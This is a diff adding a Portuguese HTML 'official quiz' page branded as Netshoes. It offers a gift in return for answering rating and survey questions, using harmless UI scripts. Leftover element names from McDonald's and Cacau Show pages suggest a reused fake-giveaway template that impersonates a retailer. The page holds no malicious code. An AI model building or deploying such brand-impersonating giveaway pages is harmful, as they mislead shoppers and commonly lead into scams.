@@ -1,0 +1,352 @@
+<!DOCTYPE html><html><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+  <title>Netshoes | Quiz oficial</title>
+  <link rel="apple-touch-icon" sizes="180x180" href="images/logo_1.png">
+  <link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
+  <script async="" src="js/fbevents.js"></script><script src="js/jquery.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="js/script.js"></script>
+  <script src="js/021532d534.js" crossorigin="anonymous"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      let cardGradeButtons = document.querySelectorAll(".card__grade");
+      let resposta1Buttons = document.querySelectorAll(".resposta1");
+      let resposta2Buttons = document.querySelectorAll(".resposta2");
+
+      cardGradeButtons.forEach(function (button) {
+        button.addEventListener("click", function () {
+          toggleButton(this, cardGradeButtons);
+          checkConditions();
+        });
+      });
+
+      resposta1Buttons.forEach(function (button) {
+        button.addEventListener("click", function () {
+          toggleButton(this, resposta1Buttons);
+          checkConditions();
+        });
+      });
+
+      resposta2Buttons.forEach(function (button) {
+        button.addEventListener("click", function () {
+          toggleButton(this, resposta2Buttons);
+          checkConditions();
+        });
+      });
+
+      function toggleButton(clickedButton, buttons) {
+        buttons.forEach(function (btn) {
+          btn.classList.remove("active");
+        });
+
+        clickedButton.classList.add("active");
+      }
+
+      function checkConditions() {
+        const enviarRespostaButton =
+          document.getElementById("enviarResposta");
+        const resposta1Active = document.querySelector(".resposta1.active");
+        const resposta2Active = document.querySelector(".resposta2.active");
+
+        // Verifica se algum input do tipo radio está selecionado
+        const radios = document.querySelectorAll('input[type="radio"]');
+        let radioSelected = false;
+        radios.forEach((radio) => {
+          if (radio.checked) {
+            radioSelected = true;
+          }
+        });
+
+        if (
+          enviarRespostaButton &&
+          resposta1Active &&
+          resposta2Active &&
+          radioSelected
+        ) {
+          // Ativa o botão se todas as condições são atendidas
+          enviarRespostaButton.removeAttribute("disabled");
+          enviarRespostaButton.classList.add("active");
+        } else {
+          // Desativa o botão se alguma condição não for atendida
+          enviarRespostaButton.setAttribute("disabled", "true");
+        }
+      }
+    });
+
+    function toggleResponse(clickedElement, group) {
+      // Obtém todos os elementos do mesmo grupo
+      const groupElements = document.querySelectorAll(`.${group}`);
+
+      // Remove a classe 'active' de todos os elementos do mesmo grupo
+      groupElements.forEach((element) => {
+        element.classList.remove("active");
+      });
+
+      // Adiciona a classe 'active' apenas ao elemento clicado
+      clickedElement.classList.add("active");
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      let cardGradeButtons = document.querySelectorAll(".card__grade");
+      let resposta1Buttons = document.querySelectorAll(".resposta1");
+      let resposta2Buttons = document.querySelectorAll(".resposta2");
+
+      cardGradeButtons.forEach(function (button) {
+        button.addEventListener("click", function () {
+          toggleButton(this, cardGradeButtons);
+          checkConditions();
+        });
+      });
+
+      resposta1Buttons.forEach(function (button) {
+        button.addEventListener("click", function () {
+          toggleButton(this, resposta1Buttons);
+          checkConditions();
+        });
+      });
+
+      resposta2Buttons.forEach(function (button) {
+        button.addEventListener("click", function () {
+          toggleButton(this, resposta2Buttons);
+          checkConditions();
+        });
+      });
+
+      function toggleButton(clickedButton, buttons) {
+        buttons.forEach(function (btn) {
+          btn.classList.remove("active");
+        });
+
+        clickedButton.classList.add("active");
+      }
+
+      function checkConditions() {
+        const enviarRespostaButton =
+          document.getElementById("enviarResposta");
+        const resposta1Active = document.querySelector(".resposta1.active");
+        const resposta2Active = document.querySelector(".resposta2.active");
+
+        // Verifica se algum input do tipo radio está selecionado
+        const radios = document.querySelectorAll('input[type="radio"]');
+        let radioSelected = false;
+        radios.forEach((radio) => {
+          if (radio.checked) {
+            radioSelected = true;
+          }
+        });
+
+        if (
+          enviarRespostaButton &&
+          resposta1Active &&
+          resposta2Active &&
+          radioSelected
+        ) {
+          // Ativa o botão se todas as condições são atendidas
+          enviarRespostaButton.removeAttribute("disabled");
+          enviarRespostaButton.classList.add("active");
+        } else {
+          // Desativa o botão se alguma condição não for atendida
+          enviarRespostaButton.setAttribute("disabled", "true");
+        }
+      }
+    });
+
+    $(document).ready(function () {
+      console.log("hads");
+      $("#inicio").click(function () {
+        console.log("hads");
+        $("#primeiro").css("display", "none");
+        $("#mcdonalds").css("display", "block");
+      });
+    });
+
+    function toggleCard(clickedElement) {
+      const allCards = document.querySelectorAll(".card__grade");
+
+      allCards.forEach((card) => {
+        card.classList.remove("active");
+      });
+      console.log(clickedElement.id);
+      // Adicione um switch para lidar com diferentes ações
+      switch (clickedElement.id) {
+        case "card__grade1":
+          updateStars("star1", "fa-solid fa-star active", "#ffd700");
+          updateStars("star2", "fa-regular fa-star", "#7e7e7e");
+          updateStars("star3", "fa-regular fa-star", "#7e7e7e");
+          updateStars("star4", "fa-regular fa-star", "#7e7e7e");
+          updateStars("star5", "fa-regular fa-star", "#7e7e7e");
+          break;
+        case "card__grade2":
+          updateStars("star1", "fa-solid fa-star active", "#ffd700");
+          updateStars("star2", "fa-solid fa-star active", "#ffd700");
+          updateStars("star3", "fa-regular fa-star", "#7e7e7e");
+          updateStars("star4", "fa-regular fa-star", "#7e7e7e");
+          updateStars("star5", "fa-regular fa-star", "#7e7e7e");
+          break;
+        case "card__grade3":
+          updateStars("star1", "fa-solid fa-star active", "#ffd700");
+          updateStars("star2", "fa-solid fa-star active", "#ffd700");
+          updateStars("star3", "fa-solid fa-star active", "#ffd700");
+          updateStars("star4", "fa-regular fa-star", "#7e7e7e");
+          updateStars("star5", "fa-regular fa-star", "#7e7e7e");
+          break;
+        case "card__grade4":
+          updateStars("star1", "fa-solid fa-star active", "#ffd700");
+          updateStars("star2", "fa-solid fa-star active", "#ffd700");
+          updateStars("star3", "fa-solid fa-star active", "#ffd700");
+          updateStars("star4", "fa-solid fa-star active", "#ffd700");
+          updateStars("star5", "fa-regular fa-star", "#7e7e7e");
+          break;
+        case "card__grade5":
+          updateStars("star1", "fa-solid fa-star active", "#ffd700");
+          updateStars("star2", "fa-solid fa-star active", "#ffd700");
+          updateStars("star3", "fa-solid fa-star active", "#ffd700");
+          updateStars("star4", "fa-solid fa-star active", "#ffd700");
+          updateStars("star5", "fa-solid fa-star active", "#ffd700");
+          break;
+        // Adicione mais casos conforme necessário
+        default:
+          // Ação padrão, se nenhum caso corresponder
+          console.log("Nenhum caso correspondente");
+      }
+    }
+
+    function updateStars(elementId, className, color) {
+      const starElement = document.getElementById(elementId);
+      if (starElement) {
+        console.log(color);
+        starElement.className = className;
+        starElement.style.color = color; // Adiciona a cor amarela
+      } else {
+        console.error("Elemento não encontrado com ID: " + elementId);
+      }
+    }
+
+    // Adicione um evento de clique aos elementos que deseja controlar
+    const cards = document.querySelectorAll(".card__grade");
+
+    cards.forEach((card) => {
+      card.addEventListener("click", function () {
+        toggleCard(this); // "this" se refere ao elemento clicado
+      });
+    });
+  </script>
+</head>
+<body>
+  <header>
+    <i class="fa-solid fa-bars" style="color: white"></i>
+    <img src="images/logo.png" alt="">
+  </header>
+  <div class="popup__progress ativo">
+    <div class="popup__progress-item popup__progress-atual"></div>
+    <div class="popup__progress-line"></div>
+    <div class="popup__progress-item">⏱️</div>
+    <div class="popup__progress-line"></div>
+    <div class="popup__progress-item">⏱️</div>
+    <div class="popup__progress-line"></div>
+    <div class="popup__progress-item">🎉</div>
+  </div>
+  <main>
+    <div class="card cacau1" id="cacau1">
+      <div class="card__logo">
+        <img src="images/img1.jpg" alt="">
+      </div>
+      <div class="card__satisfacao">
+        <h2>
+          De 0 a 10: Quanto você gostaria de receber um presente da Netshoes?
+        </h2>
+        <div class="card-radios">
+          <div class="radioWrapper">
+            <div class="quiz__answers">
+              <label class="container">0
+                <input type="radio" name="option1" class="quiz__input" value="0">
+                <span class="checkmark"></span>
+              </label>
+              <label class="container">1
+                <input type="radio" name="option1" class="quiz__input" value="1">
+                <span class="checkmark"></span>
+              </label>
+              <label class="container">
+                2
+                <input type="radio" name="option1" class="quiz__input" value="2">
+                <span class="checkmark"></span>
+              </label>
+              <label class="container">
+                3
+                <input type="radio" name="option1" class="quiz__input" value="3">
+                <span class="checkmark"></span>
+              </label>
+              <label class="container">
+                4
+                <input type="radio" name="option1" class="quiz__input" value="4">
+                <span class="checkmark"></span>
+              </label>
+            </div>
+          </div>
+          <div class="radioWrapper">
+            <label class="container">5
+              <input type="radio" name="option1" class="quiz__input" value="5">
+              <span class="checkmark"></span>
+            </label>
+            <label class="container">6
+              <input type="radio" name="option1" class="quiz__input" value="6">
+              <span class="checkmark"></span>
+            </label>
+            <label class="container">7
+              <input type="radio" name="option1" class="quiz__input" value="7">
+              <span class="checkmark"></span>
+            </label>
+            <label class="container">8
+              <input type="radio" name="option1" class="quiz__input" value="8">
+              <span class="checkmark"></span>
+            </label>
+            <label class="container">9
+              <input type="radio" name="option1" class="quiz__input" value="9">
+              <span class="checkmark"></span>
+            </label>
+            <label class="container">10
+              <input type="radio" name="option1" class="quiz__input" value="10">
+              <span class="checkmark"></span>
+            </label>
+          </div>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2>O que você espera da Netshoes no futuro?</h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p>Mais lojas e acessibilidade</p>
+          </div>
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p>Novas parcerias</p>
+          </div>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2>
+          Considera a Netshoes um loja adequada para presentear uma pessoa
+          amada?
+        </h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Sim</p>
+          </div>
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Não</p>
+          </div>
+        </div>
+      </div>
+      <a href="pag2.html">
+        <button class="card__enviarResposta" id="enviarResposta" onclick="cacau1()" disabled="">
+          Enviar avaliação
+        </button>
+      </a>
+    </div>
+
+  <script src="js/jquery-3.2.1.slim.min.js" crossorigin="anonymous"></script>
+  <script src="js/popper.min.js" crossorigin="anonymous"></script>
+  <script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+
+</body></html>
